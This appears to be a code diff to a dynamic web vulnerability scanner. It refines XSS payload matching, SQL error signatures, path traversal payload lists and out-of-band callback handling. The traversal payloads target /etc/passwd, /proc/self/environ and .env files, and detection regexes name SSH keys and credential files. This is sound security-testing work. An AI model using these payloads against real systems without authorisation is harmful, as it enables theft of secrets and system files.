+        # Use robust payload search that handles encoding and truncation
+        payload_index = self._find_payload_robust(html, payload)
         
         while i < len(html):
             # Check if we've reached the payload location
@@ -4115,6 +4566,87 @@ class HTMLContextParser:
         if not self.context_stack:
             return self.HTML_TEXT
         return self.context_stack[-1]
+    
+    def _find_payload_robust(self, html: str, payload: str) -> int:
+        """
+        Robust payload search that handles encoding, truncation, and case variations.
+        
+        Args:
+            html: The HTML content to search in
+            payload: The payload to search for
+            
+        Returns:
+            int: Index of payload in HTML, or -1 if not found
+        """
+        # Try direct case-insensitive search first
+        index = html.lower().find(payload.lower())
+        if index != -1:
+            return index
+        
+        # Try HTML entity decoded versions
+        try:
+            import html as html_module
+            decoded_payload = html_module.unescape(payload)
+            if decoded_payload != payload:
+                index = html.lower().find(decoded_payload.lower())
+                if index != -1:
+                    return index
+        except Exception:
+            pass
+        
+        # Try URL decoded versions
+        try:
+            from urllib.parse import unquote
+            url_decoded = unquote(payload)
+            if url_decoded != payload:
+                index = html.lower().find(url_decoded.lower())
+                if index != -1:
+                    return index
+        except Exception:
+            pass
+        
+        # Try base64 decoded versions (common encoding technique)
+        try:
+            import base64
+            # Try standard base64
+            try:
+                b64_decoded = base64.b64decode(payload).decode('utf-8', errors='ignore')
+                if b64_decoded and len(b64_decoded) > 3:  # Ignore short random decodings
+                    index = html.lower().find(b64_decoded.lower())
+                    if index != -1:
+                        return index
+            except Exception:
+                pass
+        except Exception:
+            pass
+        
+        # Try partial matching for truncated payloads
+        # Look for significant parts of the payload (e.g., "alert(" from "<script>alert(1)</script>")
+        significant_parts = []
+        if '<script' in payload.lower():
+            significant_parts.append('alert(')
+            significant_parts.append('document.')
+            significant_parts.append('window.')
+        elif 'onerror=' in payload.lower() or 'onload=' in payload.lower():
+            significant_parts.append('alert(')
+            significant_parts.append('document.')
+        
+        for part in significant_parts:
+            if part in payload.lower():
+                index = html.lower().find(part)
+                if index != -1:
+                    return index
+        
+        # Try searching for key XSS patterns even if exact payload not found
+        xss_patterns = ['<script', 'javascript:', 'onerror', 'onload', 'onmouseover', 'alert(']
+        for pattern in xss_patterns:
+            if pattern in payload.lower():
+                index = html.lower().find(pattern)
+                if index != -1:
+                    return index
+        
+        # Payload not found in any form
+        return -1
     
     def _analyze_context(self, context: str, payload: str) -> dict:
         """Analyze context and determine if XSS is exploitable."""
@@ -4313,28 +4845,64 @@ def validate_sqli_error_message(error_message: str) -> dict:
             (r'\b1064\b', 'syntax error'),
             (r'\b1065\b', 'invalid query'),
             (r'\b1146\b', 'table not found'),
+            (r'\b1054\b', 'unknown column'),
+            (r'\b1062\b', 'duplicate entry'),
+            (r'\b1045\b', 'access denied'),
+            (r'\b2002\b', 'connection refused'),
+            (r'\b1049\b', 'unknown database'),
             (r"You have an error in your SQL syntax", 'syntax error'),
             (r'MySQL.*syntax\s+error', 'syntax error'),
+            (r'Warning:\s*mysql', 'mysql warning'),
+            (r'mysqli_sql_exception', 'mysqli exception'),
+            (r'pymysql\.err\.OperationalError', 'pymysql error'),
+            (r'MariaDB.*syntax', 'mariadb syntax error'),
         ],
         'postgresql': [
             (r'ERROR:\s*42\d{3}', 'syntax error'),
             (r'SQLSTATE\s+42\d{3}', 'syntax error'),
             (r'PG::.*Error', 'database error'),
             (r'PostgreSQL.*ERROR:\s*\d{5}', 'structured error'),
+            (r'ERROR:\s*syntax\s+error', 'syntax error'),
+            (r'ERROR:\s*column.*does\s+not\s+exist', 'column error'),
+            (r'ERROR:\s*relation.*does\s+not\s+exist', 'relation error'),
+            (r'psycopg2\.ProgrammingError', 'psycopg2 error'),
+            (r'db\.Error:\s*', 'postgres db error'),
         ],
         'sqlite': [
             (r'SQLite error:\s*\d+:\s*', 'numbered error'),
             (r'sqlite3\.OperationalError:\s*', 'python error'),
             (r'SQLiteException:\s*\d+', 'java error'),
+            (r'near\s+".*":\s+syntax\s+error', 'syntax error with location'),
+            (r'no\s+such\s+table', 'table error'),
+            (r'no\s+such\s+column', 'column error'),
         ],
         'oracle': [
             (r'ORA-\d{5}', 'oracle error'),
             (r'PLS-\d{5}', 'pl/sql error'),
+            (r'ORA-00904:\s*invalid\s+identifier', 'invalid identifier'),
+            (r'ORA-00942:\s*table\s+or\s+view\s+does\s+not\s+exist', 'table not found'),
+            (r'ORA-01756:\s*quoted\s+string\s+not\s+properly\s+terminated', 'unterminated string'),
+            (r'java\.sql\.SQLException:\s*ORA-', 'java oracle error'),
         ],
         'sqlserver': [
             (r'\[Microsoft\]\[ODBC\s+SQL\s+Server\]', 'odbc error'),
             (r'SQLServer.*Exception:\s*\d+', '.net error'),
             (r'Message:\s*\d+, Level \d+, State \d+', 'structured message'),
+            (r'Incorrect\s+syntax\s+near', 'syntax error'),
+            (r'Invalid\s+column\s+name', 'column error'),
+            (r'Could\s+not\s+find\s+server', 'server error'),
+            (r'com\.microsoft\.sqlserver\.jdbc\.SQLServerException', 'jdbc error'),
+        ],
+        'mongodb': [
+            (r'MongoError:', 'mongo error'),
+            (r'MongoServerError:', 'mongo server error'),
+            (r'failed.*syntax\s+error', 'syntax error'),
+            (r'location\d+.*failed', 'location error'),
+        ],
+        'cassandra': [
+            (r'InvalidRequest:', 'invalid request'),
+            (r'SyntaxError:', 'syntax error'),
+            (r'Unauthorized:', 'unauthorized'),
         ]
     }
     
@@ -4370,20 +4938,50 @@ def validate_sqli_error_message(error_message: str) -> dict:
     
     # Check for contextual indicators with database terms
     contextual_patterns = [
-        r'syntax\s+error.*near',
-        r'unclosed\s+quotation',
-        r'unterminated\s+string',
-        r'incorrect\s+syntax',
+        (r'syntax\s+error.*near', 0.7, 'syntax error with location'),
+        (r'unclosed\s+quotation', 0.65, 'unclosed quotation'),
+        (r'unterminated\s+string', 0.65, 'unterminated string'),
+        (r'incorrect\s+syntax', 0.6, 'incorrect syntax'),
+        (r'could\s+not\s+execute\s+statement', 0.55, 'execution failure'),
+        (r'query\s+failed', 0.5, 'query failed'),
+        (r'exception.*query', 0.55, 'query exception'),
+        (r'fatal\s+error.*database', 0.6, 'fatal database error'),
     ]
     
-    for pattern in contextual_patterns:
+    for pattern, confidence, description in contextual_patterns:
         if re.search(pattern, error_lower):
             # Ensure database term is present
-            if re.search(r'(sql|mysql|postgres|oracle|sqlite|database|query)', error_lower):
+            if re.search(r'(sql|mysql|postgres|oracle|sqlite|database|query|sqlserver|mariadb)', error_lower):
                 result['is_valid_sqli'] = True
-                result['confidence'] = 0.6
-                result['reason'] = 'Contextual SQL syntax error with database term'
+                result['confidence'] = confidence
+                result['reason'] = f'Contextual SQL error: {description}'
                 return result
+    
+    # Additional fallback patterns for potential SQLi that might have 0 confidence
+    # These require multiple indicators to avoid false positives
+    fallback_patterns = [
+        (r'error.*in.*your.*sql', 0.4, 'sql error phrase'),
+        (r'query.*syntax', 0.35, 'query syntax issue'),
+        (r'database.*error', 0.3, 'database error phrase'),
+        (r'sql.*exception', 0.4, 'sql exception'),
+    ]
+    
+    pattern_matches = 0
+    total_confidence = 0.0
+    matched_descriptions = []
+    
+    for pattern, confidence, description in fallback_patterns:
+        if re.search(pattern, error_lower):
+            pattern_matches += 1
+            total_confidence += confidence
+            matched_descriptions.append(description)
+    
+    # Require at least 2 fallback patterns to avoid false positives
+    if pattern_matches >= 2:
+        result['is_valid_sqli'] = True
+        result['confidence'] = min(total_confidence / pattern_matches + 0.1, 0.5)  # Cap at 0.5
+        result['reason'] = f'Multiple fallback SQLi patterns matched: {", ".join(matched_descriptions)}'
+        return result
     
     # No valid SQLi indicators found
     result['reason'] = 'No valid SQLi error patterns detected'
@@ -4446,11 +5044,36 @@ def normalize_dynamic_tokens(text: str) -> str:
     
     return normalized
 
-PASSWD_PATTERN = re.compile(r"root:x:0:0|daemon:x:1:1|root:.*:0:", re.I)
-COMMAND_PATTERN = re.compile(r"uid=\d+|gid=\d+|groups=|Volume Serial Number|Directory of ", re.I)
+PASSWD_PATTERN = re.compile(
+    r"root:x:0:0|daemon:x:1:1|bin:x:2:2|sys:x:3:3|sync:x:4:65534|games:x:5:60|man:x:6:12|lp:x:7:7|mail:x:8:8|news:x:9:9|uucp:x:10:10|proxy:x:13:13|www-data:x:33:33|backup:x:34:34|list:x:38:38|irc:x:39:39|gnats:x:41:41|nobody:x:65534:65534"
+    r"|root:.*:0:|Linux version \d+\.\d+\.\d+"
+    r"|gcc version|CONFIG_|proc/version|proc/self/environ"
+    r'|\.env|\.git/config|\.ssh/|id_rsa|application\.yml|application\.properties'
+    r'|docker-compose\.yml|kubernetes\.yaml|database\.yml',
+    re.I
+)
+
+# Enhanced pattern for detecting actual /etc/passwd file content (requires multiple entries)
+ETC_PASSWD_FULL_PATTERN = re.compile(
+    r"(root:x:0:0.*\n.*daemon:x:1:1.*\n.*bin:x:2:2.*|"
+    r"root:x:0:0.*\n.*nobody:x:65534:65534.*|"
+    r"root:x:0:0.*\n.*www-data:x:33:33.*|"
+    r"root:x:0:0.*\n.*sys:x:3:3.*\n.*sync:x:4:65534.*)",
+    re.I | re.MULTILINE
+)
+COMMAND_PATTERN = re.compile(
+    r"uid=\d+|gid=\d+|groups=|Volume Serial Number|Directory of "
+    r"|uid=0 gid=0|nt authority\\system|administrator|root"
+    r'|"user":"\w+|"username":"\w+|"result":\s*true|"success":\s*true'
+    r'|command executed|shell output|executed successfully',
+    re.I
+)
 AWS_META_PATTERN = re.compile(r"(ami-id|instance-id|public-keys|security-credentials)", re.I)
 
+# Simple dict cache with size limit to prevent unbounded memory growth (fix for issue #21)
 _obfuscation_cache = {}
+_obfuscation_cache_max_size = 1000
+_obfuscation_cache_lock = threading.Lock()
 
 def obfuscate(payload, context="param"):
     """
@@ -4466,8 +5089,9 @@ def obfuscate(payload, context="param"):
     - sql: SQL injection context
     """
     cache_key = (payload, context)
-    if cache_key in _obfuscation_cache:
-        return _obfuscation_cache[cache_key]
+    with _obfuscation_cache_lock:
+        if cache_key in _obfuscation_cache:
+            return _obfuscation_cache[cache_key]
     
     def generate_variants():
         yield payload
@@ -4605,7 +5229,14 @@ def obfuscate(payload, context="param"):
                     break
     
     variants = list(set(generate_variants()))
-    _obfuscation_cache[cache_key] = variants
+    
+    # Cache with size limit
+    with _obfuscation_cache_lock:
+        if len(_obfuscation_cache) >= _obfuscation_cache_max_size:
+            # Remove oldest entry (simple FIFO)
+            _obfuscation_cache.pop(next(iter(_obfuscation_cache)))
+        _obfuscation_cache[cache_key] = variants
+    
     return variants
 
 # Context-specific obfuscation functions
@@ -6303,6 +6934,10 @@ class DynamicPayloadGenerator:
                 '../../../etc/passwd',
                 '..\\..\\..\\..\\windows\\win.ini',
                 '....//....//....//etc/passwd',
+                '../../../proc/version',
+                '../../../proc/self/environ',
+                '../../../.env',
+                '../../../docker-compose.yml',
             ])
         
         # Add framework-specific prefixes/suffixes if we know the framework
@@ -6757,7 +7392,7 @@ class JSONGrammarMutator:
         """Recursively mutate string values."""
         import random
         
-        if depth > 50:  # Prevent infinite recursion
+        if depth > 20:  # Prevent infinite recursion (reduced from 50 for safety)
             return
         
         if isinstance(obj, dict):
@@ -6777,7 +7412,7 @@ class JSONGrammarMutator:
         """Add random keys to objects."""
         import random
         
-        if depth > 50:  # Prevent infinite recursion
+        if depth > 20:  # Prevent infinite recursion (reduced from 50 for safety)
             return
         
         if isinstance(obj, dict):
@@ -6807,7 +7442,7 @@ class JSONGrammarMutator:
         """Manipulate integer values with boundary testing."""
         import random
         
-        if depth > 50:  # Prevent infinite recursion
+        if depth > 20:  # Prevent infinite recursion (reduced from 50 for safety)
             return
         
         if isinstance(obj, dict):
@@ -6827,7 +7462,7 @@ class JSONGrammarMutator:
         """Swap types for same keys to test type handling."""
         import random
         
-        if depth > 50:  # Prevent infinite recursion
+        if depth > 20:  # Prevent infinite recursion (reduced from 50 for safety)
             return
         
         if isinstance(obj, dict):
@@ -6853,7 +7488,7 @@ class JSONGrammarMutator:
                 elif isinstance(item, (dict, list)):
                     self._apply_type_confusion(item, depth + 1)
     
-    def _add_deep_nesting(self, obj, depth=50):
+    def _add_deep_nesting(self, obj, depth=20):
         """Add deep nesting to test stack overflow."""
         import random
         
@@ -6870,7 +7505,7 @@ class JSONGrammarMutator:
         """Replace values with null to test null handling."""
         import random
         
-        if depth > 50:  # Prevent infinite recursion
+        if depth > 20:  # Prevent infinite recursion (reduced from 50 for safety)
             return
         
         if isinstance(obj, dict):
@@ -6993,7 +7628,7 @@ class XMLGrammarMutator:
         
         return mutated
     
-    def _add_deep_nesting(self, xml_string, depth=50):
+    def _add_deep_nesting(self, xml_string, depth=20):
         """Add deep nesting to test stack overflow."""
         import random
         
@@ -7141,9 +7776,10 @@ class CorpusMinimizer:
         """Generate a fingerprint for response uniqueness."""
         import hashlib
         
-        # Use status code + body length + content hash for fingerprint
-        body_sample = response_body[:500] if response_body else ""
-        fingerprint_data = f"{status_code}:{len(response_body)}:{body_sample}"
+        # Use status code + body length + full body hash for fingerprint (fix for issue #11)
+        # Hashing the entire body prevents false matches where responses differ after first 500 chars
+        body_hash = hashlib.md5(response_body.encode()).hexdigest() if response_body else ""
+        fingerprint_data = f"{status_code}:{len(response_body)}:{body_hash}"
         
         return hashlib.md5(fingerprint_data.encode()).hexdigest()
     
@@ -7243,8 +7879,8 @@ def check_chromedriver_compatibility():
 # ---------------------------------------------------------------------
 # OOB SERVER & DNS CALLBACK
 # ---------------------------------------------------------------------
-# Global reference holder for OOB results (initialized to None, set by OmegaDAST)
-_oob_scanner_instance = None
+# Thread-local reference holder for OOB results to prevent race conditions with multiple scanner instances
+_oob_scanner_local = threading.local()
 
 # Fallback OOB lists for use before scanner initialization
 _fallback_oob_results = []
@@ -7252,27 +7888,34 @@ _fallback_smtp_oob_results = []
 _fallback_dns_oob_results = []
 _fallback_https_oob_results = []
 _fallback_icmp_oob_results = []
+# Single unified lock for all OOB operations to prevent deadlock
+_fallback_oob_unified_lock = threading.Lock()
 _fallback_oob_results_lock = threading.Lock()
 _fallback_smtp_oob_lock = threading.Lock()
 _fallback_dns_oob_lock = threading.Lock()
 _fallback_https_oob_lock = threading.Lock()
 _fallback_icmp_oob_lock = threading.Lock()
 
+# Event-based notification system for OOB callbacks
+_oob_callback_events = {}  # marker -> asyncio.Event
+_oob_callback_lock = asyncio.Lock()
+
 def get_oob_results_lists():
-    """Get the current OOB results lists from the scanner instance."""
-    global _oob_scanner_instance
-    if _oob_scanner_instance:
+    """Get the current OOB results lists from the scanner instance using thread-local storage."""
+    scanner_instance = getattr(_oob_scanner_local, 'instance', None)
+    if scanner_instance:
         return {
-            'oob_results': _oob_scanner_instance.oob_results,
-            'smtp_oob_results': _oob_scanner_instance.smtp_oob_results,
-            'dns_oob_results': _oob_scanner_instance.dns_oob_results,
-            'https_oob_results': _oob_scanner_instance.https_oob_results,
-            'icmp_oob_results': _oob_scanner_instance.icmp_oob_results,
-            'oob_results_lock': _oob_scanner_instance.oob_results_lock,
-            'smtp_oob_lock': _oob_scanner_instance.smtp_oob_lock,
-            'dns_oob_lock': _oob_scanner_instance.dns_oob_lock,
-            'https_oob_lock': _oob_scanner_instance.https_oob_lock,
-            'icmp_oob_lock': _oob_scanner_instance.icmp_oob_lock
+            'oob_results': scanner_instance.oob_results,
+            'smtp_oob_results': scanner_instance.smtp_oob_results,
+            'dns_oob_results': scanner_instance.dns_oob_results,
+            'https_oob_results': scanner_instance.https_oob_results,
+            'icmp_oob_results': scanner_instance.icmp_oob_results,
+            'oob_unified_lock': scanner_instance.oob_unified_lock,
+            'oob_results_lock': scanner_instance.oob_results_lock,
+            'smtp_oob_lock': scanner_instance.smtp_oob_lock,
+            'dns_oob_lock': scanner_instance.dns_oob_lock,
+            'https_oob_lock': scanner_instance.https_oob_lock,
+            'icmp_oob_lock': scanner_instance.icmp_oob_lock
         }
     # Fallback to temporary lists if scanner not initialized
     return {
@@ -7281,6 +7924,7 @@ def get_oob_results_lists():
         'dns_oob_results': _fallback_dns_oob_results,
         'https_oob_results': _fallback_https_oob_results,
         'icmp_oob_results': _fallback_icmp_oob_results,
+        'oob_unified_lock': _fallback_oob_unified_lock,
         'oob_results_lock': _fallback_oob_results_lock,
         'smtp_oob_lock': _fallback_smtp_oob_lock,
         'dns_oob_lock': _fallback_dns_oob_lock,
@@ -7290,6 +7934,9 @@ def get_oob_results_lists():
 
 pending_oob_markers = {}  # marker -> timestamp when registered
 pending_oob_lock = threading.Lock()
+oob_marker_history = {}  # marker -> timestamp when registered (for expired markers)
+oob_marker_history_lock = threading.Lock()
+OOB_MARKER_HISTORY_TTL = 300  # Keep markers in history for 5 minutes after expiry
 
 class PortAllocator:
     _used_ports = set()
@@ -7334,15 +7981,30 @@ class OOBCallbackHandler(BaseHTTPRequestHandler):
         }
         
         oob_lists = get_oob_results_lists()
-        with oob_lists['oob_results_lock']:
+        with oob_lists['oob_unified_lock']:
             oob_lists['oob_results'].append(callback_data)
         
-        # Mark as received if this marker was pending
+        # Mark as received if this marker was pending or in history (race condition protection)
         if marker:
             with pending_oob_lock:
                 if marker in pending_oob_markers:
                     callback_data['pending'] = True
                     del pending_oob_markers[marker]
+                else:
+                    # Check history buffer for expired markers
+                    with oob_marker_history_lock:
+                        if marker in oob_marker_history:
+                            callback_data['pending'] = True
+                            callback_data['late_arrival'] = True
+                            del oob_marker_history[marker]
+            
+            # Trigger event-based notification
+            try:
+                loop = asyncio.get_event_loop()
+                if loop.is_running():
+                    asyncio.create_task(trigger_oob_callback_event(marker))
+            except RuntimeError:
+                pass  # No event loop available
         
         self.send_response(200)
         self.end_headers()
@@ -7365,15 +8027,30 @@ class OOBCallbackHandler(BaseHTTPRequestHandler):
         }
         
         oob_lists = get_oob_results_lists()
-        with oob_lists['oob_results_lock']:
+        with oob_lists['oob_unified_lock']:
             oob_lists['oob_results'].append(callback_data)
         
-        # Mark as received if this marker was pending
+        # Mark as received if this marker was pending or in history (race condition protection)
         if marker:
             with pending_oob_lock:
                 if marker in pending_oob_markers:
                     callback_data['pending'] = True
                     del pending_oob_markers[marker]
+                else:
+                    # Check history buffer for expired markers
+                    with oob_marker_history_lock:
+                        if marker in oob_marker_history:
+                            callback_data['pending'] = True
+                            callback_data['late_arrival'] = True
+                            del oob_marker_history[marker]
+            
+            # Trigger event-based notification
+            try:
+                loop = asyncio.get_event_loop()
+                if loop.is_running():
+                    asyncio.create_task(trigger_oob_callback_event(marker))
+            except RuntimeError:
+                pass  # No event loop available
         
         self.send_response(200)
         self.end_headers()
@@ -7384,22 +8061,70 @@ class OOBCallbackHandler(BaseHTTPRequestHandler):
         # Intentionally empty to reduce log noise - HTTP server logging is handled elsewhere
 
 def start_oob_server(bind="127.0.0.1", preferred_port=None):
-    port = PortAllocator.get_available_port(preferred_port)
-    server = HTTPServer((bind, port), OOBCallbackHandler)
-    thread = threading.Thread(target=server.serve_forever, daemon=True)
-    thread.start()
-    return server, port
+    """Start OOB server with error handling for port conflicts."""
+    try:
+        port = PortAllocator.get_available_port(preferred_port)
+        server = HTTPServer((bind, port), OOBCallbackHandler)
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        return server, port
+    except OSError as e:
+        logging.error(f"Failed to start OOB server on {bind}:{preferred_port or 'any port'}: {e}")
+        # Try with a different port if preferred port fails
+        if preferred_port:
+            try:
+                port = PortAllocator.get_available_port(None)
+                server = HTTPServer((bind, port), OOBCallbackHandler)
+                thread = threading.Thread(target=server.serve_forever, daemon=True)
+                thread.start()
+                logging.warning(f"OOB server started on alternative port {port}")
+                return server, port
+            except OSError as e2:
+                logging.error(f"Failed to start OOB server on alternative port: {e2}")
+                raise
+        raise
 
 def register_oob_marker(marker, timeout_seconds=30):
     """Register a marker as pending for OOB callback detection"""
+    current_time = datetime.now().timestamp()
     with pending_oob_lock:
-        pending_oob_markers[marker] = datetime.now().timestamp() + timeout_seconds
+        pending_oob_markers[marker] = current_time + timeout_seconds
+    # Also add to history for race condition protection
+    with oob_marker_history_lock:
+        oob_marker_history[marker] = current_time + timeout_seconds + OOB_MARKER_HISTORY_TTL
+
+def unregister_oob_marker(marker):
+    """Unregister a marker from pending OOB callback detection"""
+    with pending_oob_lock:
+        if marker in pending_oob_markers:
+            del pending_oob_markers[marker]
+
+async def register_oob_callback_event(marker):
+    """Register an asyncio.Event for a marker to enable event-based notification"""
+    async with _oob_callback_lock:
+        if marker not in _oob_callback_events:
+            _oob_callback_events[marker] = asyncio.Event()
+        return _oob_callback_events[marker]
+
+async def unregister_oob_callback_event(marker):
+    """Unregister an asyncio.Event for a marker"""
+    async with _oob_callback_lock:
+        if marker in _oob_callback_events:
+            del _oob_callback_events[marker]
+
+async def trigger_oob_callback_event(marker):
+    """Trigger the event for a specific marker when callback is received"""
+    async with _oob_callback_lock:
+        if marker in _oob_callback_events:
+            _oob_callback_events[marker].set()
 
 async def wait_for_oob_callback_async(marker, timeout_seconds=60, check_interval=1.0):
     """
-    Async wait for an OOB callback for a specific marker with persistent checking.
+    Async wait for an OOB callback for a specific marker with event-based notification.
     This solves the issue where network delays cause callbacks to arrive 2-3 seconds later.
-    Polls every 1 second for 60 seconds by default to catch delayed callbacks from mail queues or DNS caching.
+    Uses event-based notification instead of polling for better efficiency.
+    Falls back to polling if event system is not available.
+    Uses a single unified lock to prevent deadlock.
     """
     start_time = time.time()
     end_time = start_time + timeout_seconds
@@ -7407,21 +8132,36 @@ async def wait_for_oob_callback_async(marker, timeout_seconds=60, check_interval
     # Register the marker as pending
     register_oob_marker(marker, timeout_seconds)
     
-    while time.time() < end_time:
-        # Check if callback already received
-        with oob_results_lock:
+    # Register event for this marker
+    callback_event = await register_oob_callback_event(marker)
+    
+    # Get OOB lists and unified lock
+    oob_lists = get_oob_results_lists()
+    oob_unified_lock = oob_lists['oob_unified_lock']
+    oob_results = oob_lists['oob_results']
+    dns_oob_results = oob_lists['dns_oob_results']
+    smtp_oob_results = oob_lists['smtp_oob_results']
+    
+    try:
+        # Use event-based waiting with timeout
+        try:
+            await asyncio.wait_for(callback_event.wait(), timeout=timeout_seconds)
+        except asyncio.TimeoutError:
+            pass
+        
+        # Event was triggered or timeout occurred - check for actual results
+        with oob_unified_lock:
+            # Check HTTP OOB results
             for result in oob_results:
                 if result.get('marker') == marker:
                     return result
-        
-        # Also check DNS OOB results for the marker
-        with dns_oob_lock:
+            
+            # Check DNS OOB results for the marker
             for result in dns_oob_results:
                 if marker in result.get('domain', ''):
                     return result
-        
-        # Also check SMTP OOB results for the marker
-        with smtp_oob_lock:
+            
+            # Check SMTP OOB results for the marker
             for result in smtp_oob_results:
                 marker_in_mail_from = marker in result.get('mail_from', '') if result.get('mail_from') else False
                 marker_in_rcpt_to = any(marker in rcpt for rcpt in result.get('rcpt_to', [])) if result.get('rcpt_to') else False
@@ -7430,33 +8170,17 @@ async def wait_for_oob_callback_async(marker, timeout_seconds=60, check_interval
                 if marker_in_mail_from or marker_in_rcpt_to or marker_in_headers:
                     return result
         
-        # Sleep briefly before next check (async sleep)
-        await asyncio.sleep(check_interval)
-    
-    # Timeout reached - check one more time
-    with oob_results_lock:
-        for result in oob_results:
-            if result.get('marker') == marker:
-                return result
-    
-    with dns_oob_lock:
-        for result in dns_oob_results:
-            if marker in result.get('domain', ''):
-                return result
-    
-    with smtp_oob_lock:
-        for result in smtp_oob_results:
-            marker_in_mail_from = marker in result.get('mail_from', '') if result.get('mail_from') else False
-            marker_in_rcpt_to = any(marker in rcpt for rcpt in result.get('rcpt_to', [])) if result.get('rcpt_to') else False
-            if marker_in_mail_from or marker_in_rcpt_to:
-                return result
-    
-    return None
+        return None
+    finally:
+        # Always unregister the marker and event, even if an exception occurs
+        unregister_oob_marker(marker)
+        await unregister_oob_callback_event(marker)
 
 def wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5):
     """
     Synchronous wrapper for OOB callback detection.
     This is a blocking call - for async code, use wait_for_oob_callback_async instead.
+    Uses a single unified lock to prevent deadlock.
     """
     start_time = time.time()
     end_time = start_time + timeout_seconds
@@ -7464,34 +8188,45 @@ def wait_for_oob_callback(marker, timeout_seconds=30, check_interval=0.5):
     # Register the marker as pending
     register_oob_marker(marker, timeout_seconds)
     
-    while time.time() < end_time:
-        # Check if callback already received
-        with oob_results_lock:
+    # Get OOB lists and unified lock
+    oob_lists = get_oob_results_lists()
+    oob_unified_lock = oob_lists['oob_unified_lock']
+    oob_results = oob_lists['oob_results']
+    dns_oob_results = oob_lists['dns_oob_results']
+    
+    try:
+        while time.time() < end_time:
+            # Check all OOB result lists atomically using single unified lock to prevent deadlock
+            with oob_unified_lock:
+                # Check HTTP OOB results
+                for result in oob_results:
+                    if result.get('marker') == marker:
+                        return result
+                
+                # Check DNS OOB results for the marker
+                for result in dns_oob_results:
+                    if marker in result.get('domain', ''):
+                        return result
+            
+            # Sleep briefly before next check
+            time.sleep(check_interval)
+        
+        # Timeout reached - check one more time atomically
+        with oob_unified_lock:
+            # Check HTTP OOB results
             for result in oob_results:
                 if result.get('marker') == marker:
                     return result
-        
-        # Also check DNS OOB results for the marker
-        with dns_oob_lock:
+            
+            # Check DNS OOB results for the marker
             for result in dns_oob_results:
                 if marker in result.get('domain', ''):
                     return result
         
-        # Sleep briefly before next check
-        time.sleep(check_interval)
-    
-    # Timeout reached - check one more time
-    with oob_results_lock:
-        for result in oob_results:
-            if result.get('marker') == marker:
-                return result
-    
-    with dns_oob_lock:
-        for result in dns_oob_results:
-            if marker in result.get('domain', ''):
-                return result
-    
-    return None
+        return None
+    finally:
+        # Always unregister the marker, even if an exception occurs
+        unregister_oob_marker(marker)
 
 async def start_oob_polling_task(marker, timeout_seconds=60, check_interval=1.0):
     """
@@ -7499,11 +8234,15 @@ async def start_oob_polling_task(marker, timeout_seconds=60, check_interval=1.0)
     This spawns a background task that polls oob_results every 1 second for 60 seconds.
     Returns the task object which can be awaited or cancelled.
     """
-    task = asyncio.create_task(wait_for_oob_callback_async(marker, timeout_seconds, check_interval))
+    task = async_task_manager.create_task_sync(
+        wait_for_oob_callback_async(marker, timeout_seconds, check_interval),
+        task_name=f"oob_polling_{marker[:8]}",
+        callback=lambda t: logging.info(f"OOB polling task for marker {marker[:8]} completed")
+    )
     return task
 
 def cleanup_expired_markers():
-    """Clean up expired markers from pending tracking"""
+    """Clean up expired markers from pending tracking and history buffer"""
     current_time = datetime.now().timestamp()
     with pending_oob_lock:
         expired_markers = [
@@ -7512,6 +8251,15 @@ def cleanup_expired_markers():
         ]
         for marker in expired_markers:
             del pending_oob_markers[marker]
+    
+    # Also clean up history buffer
+    with oob_marker_history_lock:
+        expired_history_markers = [
+            marker for marker, expiry in oob_marker_history.items()
+            if expiry < current_time
+        ]
+        for marker in expired_history_markers:
+            del oob_marker_history[marker]
 
 # ---------------------------------------------------------------------
 # SMTP/Email OOB CALLBACK LISTENER
@@ -7671,7 +8419,7 @@ class SMTPOOBHandler:
             parsed_data['time'] = datetime.now().isoformat()
             
             oob_lists = get_oob_results_lists()
-            with oob_lists['smtp_oob_lock']:
+            with oob_lists['oob_unified_lock']:
                 oob_lists['smtp_oob_results'].append(parsed_data)
             
             # Enhanced logging with OOB marker detection
@@ -7684,6 +8432,20 @@ class SMTPOOBHandler:
                 logging.info(f"SMTP OOB callback from {client_addr[0]} - MAIL FROM: {parsed_data.get('mail_from')}, RCPT TO: {parsed_data.get('rcpt_to')}")
             else:
                 logging.info(f"SMTP OOB callback from {client_addr[0]}")
+            
+            # Trigger event-based notification for detected markers
+            if parsed_data.get('oob_marker_detected'):
+                for location, value, pattern in parsed_data.get('detected_markers', []):
+                    # Extract marker from the detected value
+                    marker_match = re.search(r'[a-zA-Z0-9]{8,}', value)
+                    if marker_match:
+                        marker = marker_match.group()
+                        try:
+                            loop = asyncio.get_event_loop()
+                            if loop.is_running():
+                                asyncio.create_task(trigger_oob_callback_event(marker))
+                        except RuntimeError:
+                            pass  # No event loop available
                 
         except Exception as e:
             logging.warning(f"SMTP parsing error: {e}")
@@ -7755,7 +8517,7 @@ class SMTPOOBHandler:
         if self.server:
             self.server.close()
         if self.thread:
-            self.thread.join(timeout=1)
+            self.thread.join(timeout=TASK_QUEUE_TIMEOUT)
 
 def get_smtp_oob_payloads(oob_domain, oob_ip):
     """
@@ -7797,12 +8559,18 @@ def check_smtp_oob_callback(marker, timeout_seconds=30):
     """
     Check for SMTP OOB callbacks with marker detection.
     Returns the first matching SMTP result containing the marker.
+    Uses a single unified lock to prevent deadlock.
     """
     start_time = time.time()
     end_time = start_time + timeout_seconds
     
+    # Get OOB lists and unified lock
+    oob_lists = get_oob_results_lists()
+    oob_unified_lock = oob_lists['oob_unified_lock']
+    smtp_oob_results = oob_lists['smtp_oob_results']
+    
     while time.time() < end_time:
-        with smtp_oob_lock:
+        with oob_unified_lock:
             for result in smtp_oob_results:
                 # Check MAIL FROM for marker
                 if result.get('mail_from') and marker in result['mail_from']:
@@ -7985,7 +8753,7 @@ class DNSOOBListener:
                         
                         if queried_domain:
                             oob_lists = get_oob_results_lists()
-                            with oob_lists['dns_oob_lock']:
+                            with oob_lists['oob_unified_lock']:
                                 oob_lists['dns_oob_results'].append({
                                     'domain': queried_domain,
                                     'query_type': query_type,
@@ -7999,6 +8767,17 @@ class DNSOOBListener:
                                 logging.info(f"DNS A record OOB callback from {addr[0]}: {queried_domain}")
                             else:
                                 logging.info(f"DNS {query_type} OOB callback from {addr[0]}: {queried_domain}")
+                            
+                            # Trigger event-based notification for detected markers in domain
+                            marker_match = re.search(r'[a-zA-Z0-9]{8,}', queried_domain)
+                            if marker_match:
+                                marker = marker_match.group()
+                                try:
+                                    loop = asyncio.get_event_loop()
+                                    if loop.is_running():
+                                        asyncio.create_task(trigger_oob_callback_event(marker))
+                                except RuntimeError:
+                                    pass  # No event loop available
                         
                         # Send response based on query type
